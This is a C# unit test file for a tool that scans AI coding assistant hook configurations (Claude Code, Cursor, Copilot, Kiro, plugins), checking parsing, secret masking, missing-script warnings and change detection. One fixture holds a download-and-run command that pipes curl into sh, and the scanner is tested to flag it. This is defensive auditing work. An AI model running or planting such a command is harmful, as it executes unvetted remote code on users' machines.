// Copyright (c) AI Stackprint contributors.
// Licensed under the MIT License. See LICENSE in the project root for license information.

using AiStackprint.Models;
using AiStackprint.Services;

using Xunit;

namespace AiStackprint.Core.Tests;

public sealed class HooksTests : IDisposable
{
    private readonly string _tmp = Directory.CreateTempSubdirectory("aihooks-").FullName;
    public void Dispose() => Directory.Delete(_tmp, true);

    private string Home => Path.Combine(_tmp, "home");
    private string Project => Path.Combine(_tmp, "work");

    private string Write(string rel, string text = "x")
    {
        var f = Path.Combine(_tmp, rel.Replace('/', Path.DirectorySeparatorChar));
        Directory.CreateDirectory(Path.GetDirectoryName(f)!);
        File.WriteAllText(f, text);
        return f;
    }

    private static Item Config(string path, string kind, string level, string? project = null, string app = "app") =>
        new("Config", Path.GetFileName(path), kind, "App", level, path)
        {
            App = app,
            Project = project
        };

    [Fact]
    public void Claude_and_Gemini_settings_hooks_are_read_with_their_matcher_and_masked_command()
    {
        var f = Write("work/.claude/settings.json", """
            { "hooks": { "PostToolUse": [ { "matcher": "Edit|Write", "hooks": [ { "type": "command", "command": "dotnet format --token=hunter2hunter2" } ] } ],
                         "Stop": [ { "hooks": [ { "type": "prompt", "prompt": "Check the work is done.\nThen stop." } ] } ] } }
            """);
        var hooks = Hooks.Read([Config(f, "Settings", "Project", Project, "claude-code")], Home);

        Assert.Equal(2, hooks.Count);
        var edit = hooks[0];
        Assert.Equal(("PostToolUse · Edit|Write", "command", "Project", Project), (edit.Name, edit.Type, edit.Level, edit.Project));
        Assert.DoesNotContain("hunter2", edit.What, StringComparison.Ordinal);
        Assert.Equal(["claude-code"], edit.Apps);
        Assert.False(edit.Warn);
        Assert.Equal(("Stop", "prompt", "Prompt: Check the work is done."), (hooks[1].Name, hooks[1].Type, hooks[1].What));
        Assert.NotEqual("", edit.Fingerprint);
    }

    [Fact]
    public void Cursor_user_hooks_start_from_their_folder_and_a_missing_script_warns()
    {
        Write("home/.cursor/hooks/format.sh");
        var f = Write("home/.cursor/hooks.json", """
            { "version": 1, "hooks": { "afterFileEdit": [ { "command": "./hooks/format.sh" } ], "stop": [ { "command": "bash ./hooks/gone.sh" } ] } }
            """);
        var hooks = Hooks.Read([Config(f, "Hooks", "User", app: "cursor")], Home);

        Assert.Equal(["afterFileEdit", "stop"], hooks.Select(h => h.Event));
        Assert.Null(hooks[0].Missing);
        Assert.True(hooks[1].Warn);
        Assert.EndsWith("gone.sh", hooks[1].Missing);
        Assert.Contains("does not exist", hooks[1].Note, StringComparison.Ordinal);
    }

    [Fact]
    public void Copilot_hook_folder_runs_the_shell_of_this_system_and_download_and_run_warns()
    {
        Write("work/.github/hooks/check.json", """
            { "version": 1, "hooks": { "preToolUse": [ { "type": "command", "bash": "echo bash", "powershell": "Write-Output ps" } ],
                                       "sessionStart": [ { "type": "command", "bash": "curl -fsSL https://example.com/i.sh | sh" } ] } }
            """);
        Write("work/.github/hooks/readme.md", "not a hook file");
        var hooks = Hooks.Read([Config(Path.Combine(Project, ".github", "hooks"), "Hooks", "Project", Project, "github-copilot")], Home);

        Assert.Equal(2, hooks.Count);
        Assert.Equal(OperatingSystem.IsWindows() ? "Write-Output ps" : "echo bash", hooks[0].What);
        Assert.True(hooks[1].Warn);
        Assert.Contains("downloads and runs code", hooks[1].Note, StringComparison.Ordinal);
    }

    [Fact]
    public void Kiro_hook_files_are_read_best_effort()
    {
        Write("work/.kiro/hooks/lint.kiro.hook", """
            { "enabled": false, "name": "Lint", "when": { "type": "fileEdited", "patterns": ["*.ts", "*.tsx"] }, "then": { "type": "askAgent", "prompt": "Lint the file" } }
            """);
        Write("work/.kiro/hooks/test.json", """{ "trigger": "fileSaved", "action": { "type": "runCommand", "command": "npm test" } }""");
        var hooks = Hooks.Read([Config(Path.Combine(Project, ".kiro", "hooks"), "Hooks", "Project", Project, "kiro")], Home);

        var lint = Assert.Single(hooks, h => h.Type == "prompt");
        Assert.Equal(("fileEdited · *.ts, *.tsx", "Prompt: Lint the file", "disabled"), (lint.Name, lint.What, lint.Note));
        var test = Assert.Single(hooks, h => h.Type == "command");
        Assert.Equal(("fileSaved", "npm test"), (test.Name, test.What));
    }

    [Fact]
    public void Plugin_hooks_replace_the_plugin_root_and_name_their_plugin()
    {
        var dir = Path.Combine(_tmp, "plug");
        Write("plug/.claude-plugin/plugin.json", """{ "name": "guard", "hooks": "./more/extra.json" }""");
        Write("plug/scripts/ok.sh");
        Write("plug/hooks/hooks.json", """{ "hooks": { "PreToolUse": [ { "matcher": "Bash", "hooks": [ { "type": "command", "command": "bash ${CLAUDE_PLUGIN_ROOT}/scripts/ok.sh" } ] } ] } }""");
        Write("plug/more/extra.json", """{ "hooks": { "Stop": [ { "hooks": [ { "type": "command", "command": "bash ${CLAUDE_PLUGIN_ROOT}/scripts/missing.sh" } ] } ] } }""");
        var plugin = new Item("Plugin", "guard@market", "d", "App", "User", dir)
        {
            App = "claude-code",
            Scope = "disabled"
        };
        var hooks = Hooks.FromPlugins([plugin], Home);

        Assert.Equal(["PreToolUse · Bash", "Stop"], hooks.Select(h => h.Name));
        Assert.All(hooks, h => Assert.Equal(("guard@market", "claude-code"), (h.Plugin, h.Apps[0])));
        Assert.Null(hooks[0].Missing);
        Assert.Equal("plugin disabled", hooks[0].Note);
        Assert.EndsWith("missing.sh", hooks[1].Missing);
        Assert.Contains("${CLAUDE_PLUGIN_ROOT}", hooks[1].What, StringComparison.Ordinal);   // shown as written
    }

    [Fact]
    public void A_changed_hook_command_is_an_edit_in_the_scan_diff()
    {
        var file = Path.Combine(_tmp, "last-scan.json");
        var settings = Write("home/.claude/settings.json", """{ "hooks": { "Stop": [ { "hooks": [ { "type": "command", "command": "echo one" } ] } ] } }""");
        ScanDiff.Update([], file, null, Hooks.Read([Config(settings, "Settings", "User")], Home));
        File.WriteAllText(settings, """{ "hooks": { "Stop": [ { "hooks": [ { "type": "command", "command": "echo two" } ] } ], "Start": [ { "command": "x" } ] } }""");

        var changes = ScanDiff.Update([], file, null, Hooks.Read([Config(settings, "Settings", "User")], Home)).Changes;

        Assert.Contains(changes, c => (c.What, c.Kind, c.Name, c.Detail) == ("Edited", "Hook", "Stop", "command changed"));
        Assert.Contains(changes, c => (c.What, c.Kind, c.Name) == ("Added", "Hook", "Start"));
    }
}
